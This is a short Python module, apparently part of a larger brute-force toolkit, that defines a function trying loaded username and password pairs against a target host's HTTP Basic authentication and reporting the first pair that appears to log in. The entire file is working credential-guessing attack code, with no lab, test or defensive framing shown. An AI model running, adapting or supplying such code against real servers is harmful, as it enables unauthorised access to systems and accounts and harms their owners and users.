import requests
from requests.auth import HTTPBasicAuth
from bruteforce.credentials_loader import load_credentials

def http_bruteforce(ip, port=80):
    creds = load_credentials()
    url = f"http://{ip}:{port}"
    print(f"[*] Trying HTTP brute-force on {url}")

    session = requests.Session()

    failure_keywords = ["login failed", "invalid", "unauthorized", "try again", "incorrect", "signin"]

    for username, password in creds:
        try:
            response = session.get(url, auth=HTTPBasicAuth(username, password), timeout=4)

            if response.status_code == 401:
                continue

            if any(keyword in response.text.lower() for keyword in failure_keywords):
                continue

            if response.url != url or response.cookies:
                print(f"[+] HTTP login success: {username}:{password}")
                return (username, password)

        except requests.RequestException:
            continue

    print("[-] No valid HTTP credentials found.")
    return None
